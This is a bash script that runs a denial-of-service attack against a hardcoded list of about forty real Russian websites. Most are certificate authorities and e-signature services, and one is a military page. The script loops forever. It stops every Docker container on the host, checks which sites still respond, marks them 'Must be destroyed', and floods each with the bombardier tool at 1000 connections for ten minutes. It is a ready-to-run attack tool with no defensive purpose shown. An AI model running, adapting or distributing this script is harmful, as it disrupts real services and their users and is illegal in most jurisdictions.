#!/bin/bash

# FILE #3 E-SIGNATURE

# Configuration of Bombardier
BOMBARDIER_TIMEOUT=10m #this is the time of bombardement
BOMBARDIER_CONNECTIONS=1000

declare -a sites=(
"https://iecp.ru/ep/ep-verification"
"https://iecp.ru/ep/uc-list"
"https://uc-osnovanie.ru/"
"http://www.nucrf.ru"
"http://www.belinfonalog.ru"
"http://www.roseltorg.ru"
"http://www.astralnalog.ru"
"http://www.nwudc.ru"
"http://www.center-inform.ru"
"https://kk.bank/UdTs"
"http://structure.mil.ru/structure/uc/info.htm"
"http://www.ucpir.ru"
"http://dreamkas.ru"
"http://www.e-portal.ru"
"http://izhtender.ru"
"http://imctax.parus-s.ru"
"http://www.icentr.ru"
"http://www.kartoteka.ru"
"http://rsbis.ru/elektronnaya-podpis"
"http://www.stv-it.ru"
"http://www.crypset.ru"
"http://www.kt-69.ru"
"http://www.24ecp.ru"
"http://kraskript.com"
"http://ca.ntssoft.ru"
"http://www.y-center.ru"
"http://www.rcarus.ru"
"http://rk72.ru"
"http://squaretrade.ru"
"http://ca.gisca.ru"
"http://www.otchet-online.ru"
"http://udcs.ru"
"http://www.cit-ufa.ru"
"http://elkursk.ru"
"http://www.icvibor.ru"
"http://ucestp.ru"
"http://mcspro.ru"
"http://www.infotrust.ru"
"http://epnow.ru"
"http://ca.kamgov.ru"
"http://mascom-it.ru"
"http://cfmc.ru"
)

while :
do
  echo "Stop all containers"
  docker stop $(docker ps -aq)
  echo "Docker containers stopped"

  echo "Run ddos for all sites"
  for site in "${sites[@]}"; do
  
    status_code=$(curl -m 2 -s -o /dev/null  -w "%{http_code}" "$site")
    status_code=$(expr "$status_code" + 0)
    # If status code is zero site is already blocked
  
    site_status="${site} status code ${status_code}"
    echo "$site_status"
  
    if (("$status_code" != 0 && "$status_code" <= 400)); then
      echo "Must be destroyed"
      docker run -ti -d --rm alpine/bombardier -c "$BOMBARDIER_CONNECTIONS" -d "$BOMBARDIER_TIMEOUT" -l "$site"
    fi
  
  done

  echo "DDoS is up and running..."

  #these are SECONDS and they must correspond to BOMBARDIER_TIMEOUT above...in this case it's 10minutes
  sleep 600

  echo "Restarting DDoS, checking which sites are still working"
done